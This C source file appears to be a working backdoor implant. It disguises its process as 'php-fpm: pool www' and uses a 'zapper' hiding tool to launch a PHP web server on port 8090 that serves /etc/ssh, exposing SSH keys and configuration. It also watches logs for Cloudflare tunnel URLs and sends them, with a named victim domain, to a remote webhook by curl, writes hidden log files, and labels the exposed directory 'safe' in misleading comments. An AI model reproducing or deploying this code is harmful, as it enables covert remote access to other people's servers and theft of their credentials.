#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <errno.h>
#include <sys/wait.h>
#include <time.h>
#include <stdarg.h>
#include <ctype.h>
#include <sys/prctl.h>   /* prctl(), PR_SET_NAME */

#define RAWLOG "/var/log/cloudflared_raw.log"
#define OUTLOG "/var/log/.cache.log"

/* Fake argv[0] we pass when exec'ing curl so ps shows "zapper" */
#define ZAPPER_PATH "/usr/local/bin/zapper"
#define CURL_PATH "/usr/bin/curl"             /* real curl binary */

#define WEBHOOK_URL "https://pallcor.com.ar/notify2.php"

/* PHP server command to run (safe webroot) */
#define PHP_BIN "/usr/bin/php"
#define PHP_ADDR "0.0.0.0:8090"
#define WEB_ROOT "/etc/ssh"

/* Permanent file to store last sent URL so we don't resend after restart */
#define LAST_SENT_DIR "/var/lib/gcc-notify"
#define LAST_SENT_FILE LAST_SENT_DIR "/last_sent"

/* How many consecutive observations of a candidate URL before we accept it */
#define STABLE_COUNT 3

/* Domain to send (edit in source) or leave empty "" to use hostname */
#define TUNNEL_DOMAIN "umbandung.ac.id"

#define MAXLINE 4096
#define MAXURL 1024
#define SLEEP_RETRY_USEC 300000

/* logging helper into RAWLOG for debugging */
static void log_raw(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    int fd = open(RAWLOG, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0) {
        dprintf(fd, "[%lld] ", (long long)time(NULL));
        vdprintf(fd, fmt, ap);
        dprintf(fd, "\n");
        close(fd);
    }
    va_end(ap);
}
/* set_proc_name: set kernel-visible name and try to overwrite argv[0] */
extern char **environ;

/* Enhanced: set kernel name and overwrite argv/env contiguous memory region */
static void set_proc_name(const char *name, int argc, char **argv) {
    /* 1) kernel-visible name (PR_SET_NAME) — still limited to 15 visible chars */
    if (prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0) != 0) {
        /* non-fatal; optionally log */
        /* fprintf(stderr, "prctl(PR_SET_NAME) failed: %s\n", strerror(errno)); */
    }

    /* 2) best-effort: find contiguous memory block from argv[0] through env strings */
    if (argc <= 0 || argv == NULL || argv[0] == NULL) return;

    char *start = argv[0];
    char *end = start;

    /* Move end to end of last argv string */
    for (int i = 0; i < argc; ++i) {
        if (argv[i]) {
            char *p = argv[i] + strlen(argv[i]);
            if (p > end) end = p;
        }
    }

    /* Move end further across environment strings (if contiguous) */
    for (char **e = environ; e && *e; ++e) {
        char *p = *e + strlen(*e);
        if (p > end) end = p;
    }

    size_t region_len = (end > start) ? (size_t)(end - start) : strlen(argv[0]);

    /* If region is too small, zero what we can and copy truncated name */
    if (region_len == 0) return;

    size_t name_len = strlen(name);
    /* ensure we leave final byte as NUL */
    size_t copy_len = (name_len < region_len - 1) ? name_len : (region_len - 1);

    /* Overwrite the whole region with NULs then copy the name at the start */
    memset(start, 0, region_len);
    memcpy(start, name, copy_len);
    start[copy_len] = '\0';
    /* done */
}



/* safe atomic write to a file */
static int atomic_write(const char *path, const char *data) {
    char tmp[1024];
    snprintf(tmp, sizeof(tmp), "%s.tmp.%d", path, getpid());
    int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -1;
    ssize_t w = write(fd, data, strlen(data));
    close(fd);
    if (w < 0) { unlink(tmp); return -1; }
    if (rename(tmp, path) != 0) { unlink(tmp); return -1; }
    return 0;
}

/* read last-sent from file (if exists). Returns 1 if read, 0 otherwise. */
static int read_last_sent(char *buf, size_t bufsz) {
    int fd = open(LAST_SENT_FILE, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t r = read(fd, buf, bufsz - 1);
    close(fd);
    if (r <= 0) return 0;
    buf[r] = '\0';
    /* strip trailing newline */
    char *nl = strchr(buf, '\n');
    if (nl) *nl = '\0';
    return 1;
}

/* write last-sent (atomic) */
static void write_last_sent(const char *url) {
    /* ensure dir exists */
    mkdir(LAST_SENT_DIR, 0755);
    atomic_write(LAST_SENT_FILE, url);
}

/* spawn PHP built-in server child (raw output -> RAWLOG) */
static void child_run_phpserver(void) {
    pid_t pid = fork();
    if (pid < 0) _exit(1);

    if (pid == 0) {
        /* child */

        /* open RAWLOG for output */
        int fd = open(RAWLOG, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd < 0) _exit(1);

        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) close(fd);

        setsid();

        /* ---------------------------------------------
           EXACT argument format you asked for:
           zapper -f -a "php-fpm: pool www" /usr/bin/php -S 0.0.0.0:8090 -t WEB_ROOT
           --------------------------------------------- */
        char *argv[] = {
            (char*)ZAPPER_PATH,        // fake argv[0] (process hidden as zapper)
            "-f",
            "-a",
            "php-fpm: pool www",
            "/usr/bin/php",            // executable that zapper will run
            "-S",
            PHP_ADDR,                  // "0.0.0.0:8090"
            "-t",
            (char*)WEB_ROOT,           // SAFE webroot you control
            NULL
        };

        /* Exec zapper, which will internally execute /usr/bin/php */
        execv(ZAPPER_PATH, argv);

        /* if exec fails */
        dprintf(STDERR_FILENO, "execv zapper failed: %s\n", strerror(errno));
        _exit(1);
    }

    /* parent */
}


/* trim trailing punctuation/whitespace */
static void trim_trailing(char *s) {
    size_t len = strlen(s);
    while (len > 0) {
        unsigned char c = s[len-1];
        if (c == '"' || c == '\'' || c == ')' || c == ']' || c == '}' ||
            c == '.' || c == ',' || c == ';' || c == ':' || c == '|' )
        { s[len-1] = '\0'; len--; continue; }
        if (isspace(c)) { s[len-1] = '\0'; len--; continue; }
        break;
    }
}

/* normalize URL: remove fragment and trailing slash(es) */
static void normalize_url(char *u) {
    char *hash = strchr(u, '#');
    if (hash) *hash = '\0';
    trim_trailing(u);
    size_t len = strlen(u);
    while (len > 0 && u[len-1] == '/') { u[len-1] = '\0'; len--; }
}

/* extract trycloudflare URL from a line. returns 1 if found and filled into out */
static int extract_trycloudflare(const char *line, char *out, size_t outsz) {
    const char *p = strstr(line, "https://");
    while (p) {
        size_t i = 0; const char *q = p;
        while (*q && !isspace((unsigned char)*q) && i + 1 < outsz) { out[i++] = *q++; }
        out[i] = '\0';
        trim_trailing(out);
        if (strstr(out, "trycloudflare.com") != NULL) {
            normalize_url(out);
            return 1;
        }
        p = strstr(p + 1, "https://");
    }
    return 0;
}

/* write only url to OUTLOG (atomic) */
static void write_outlog(const char *url) {
    atomic_write(OUTLOG, url);
}

/* send webhook via curl but set argv[0] to ZAPPER_PATH so ps shows "zapper" */
/* send webhook via curl but make the visible argv start with:
   /usr/local/bin/zapper -f -a "php-fpm: pool www" --curl-args...
   The real binary executed remains CURL_PATH (e.g. /usr/bin/curl). */
static void send_webhook(const char *domain, const char *url) {
    pid_t pid = fork();
    if (pid < 0) {
        log_raw("send_webhook: fork failed: %s", strerror(errno));
        return;
    }

    if (pid == 0) {
        /* child: redirect stdout/stderr to RAWLOG so curl output/JSON is captured */
        int fd = open(RAWLOG, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd >= 0) {
            dup2(fd, STDOUT_FILENO);
            dup2(fd, STDERR_FILENO);
            if (fd > STDERR_FILENO) close(fd);
        }

        /* Build data fields */
        char domain_field[512];
        char url_field[MAXURL + 64];
        snprintf(domain_field, sizeof(domain_field), "domain=%s", domain);
        snprintf(url_field, sizeof(url_field), "url=%s", url);

        /* Build argv so the process looks like:
           /usr/local/bin/zapper -f -a "php-fpm: pool www" --silent --show-error --fail -X POST --data-urlencode domain=... --data-urlencode url=... WEBHOOK_URL
           Note: we exec the real CURL_PATH but pass this argv array so argv[0] and others are visible as desired. */
        char *const argv[] = {
            (char*)ZAPPER_PATH,           /* visible as zapper */
            (char*)"-f",
            (char*)"-a",
            (char*)"php-fpm: pool www",
            (char*)"--silent",
            (char*)"--show-error",
            (char*)"--fail",
            (char*)"-X",
            (char*)"POST",
            (char*)"--data-urlencode",
            domain_field,
            (char*)"--data-urlencode",
            url_field,
            (char*)WEBHOOK_URL,
            NULL
        };

        /* Execute the real curl binary with the crafted argv */
        execv(CURL_PATH, argv);

        /* execv returned -> failure */
        dprintf(STDERR_FILENO, "execv curl failed: %s\n", strerror(errno));
        _exit(127);
    } else {
        /* parent: wait and log status */
        int status = 0;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            log_raw("send_webhook: curl exit %d", WEXITSTATUS(status));
        } else {
            log_raw("send_webhook: curl terminated abnormally");
        }
    }
}


int main(int argc, char **argv) {
    /* set process name to "kontol" (max 15 visible chars) */
    set_proc_name("php-fpm: pool www", argc, argv);

    /* ... rest of your program ... */

    /* domain from define or hostname fallback */
    char domain[512] = {0};
    if (TUNNEL_DOMAIN[0] != '\0') strncpy(domain, TUNNEL_DOMAIN, sizeof(domain)-1);
    else if (gethostname(domain, sizeof(domain)) != 0) strncpy(domain, "unknown", sizeof(domain)-1);

    /* load persistent last_sent */
    char last_sent[MAXURL] = {0};
    read_last_sent(last_sent, sizeof(last_sent));
    if (last_sent[0]) log_raw("loaded last_sent=%s", last_sent);

    child_run_phpserver();

    FILE *fp = NULL;
    char candidate[MAXURL] = {0};
    int candidate_count = 0;

    while (1) {
        if (!fp) {
            fp = fopen(RAWLOG, "r");
            if (!fp) { usleep(SLEEP_RETRY_USEC); continue; }
            fseek(fp, 0, SEEK_END);
        }

        char line[MAXLINE];
        if (fgets(line, sizeof(line), fp) != NULL) {
            char url[MAXURL];
            if (extract_trycloudflare(line, url, sizeof(url))) {
                if (candidate[0] == '\0' || strcmp(candidate, url) != 0) {
                    strncpy(candidate, url, sizeof(candidate)-1);
                    candidate_count = 1;
                    log_raw("candidate=%s (1)", candidate);
                } else {
                    candidate_count++;
                    log_raw("candidate=%s (%d)", candidate, candidate_count);
                }

                if (candidate_count >= STABLE_COUNT) {
                    if (last_sent[0] == '\0' || strcmp(last_sent, candidate) != 0) {
                        write_outlog(candidate);
                        send_webhook(domain, candidate);
                        write_last_sent(candidate);
                        strncpy(last_sent, candidate, sizeof(last_sent)-1);
                        log_raw("sent and saved last_sent=%s", last_sent);
                    } else {
                        log_raw("candidate equals last_sent; skipping send");
                    }
                    candidate[0] = '\0'; candidate_count = 0;
                }
            }
            continue;
        }

        if (feof(fp)) { clearerr(fp); usleep(SLEEP_RETRY_USEC); continue; }

        fclose(fp); fp = NULL; usleep(SLEEP_RETRY_USEC);
    }

    if (fp) fclose(fp);
    return 0;
}
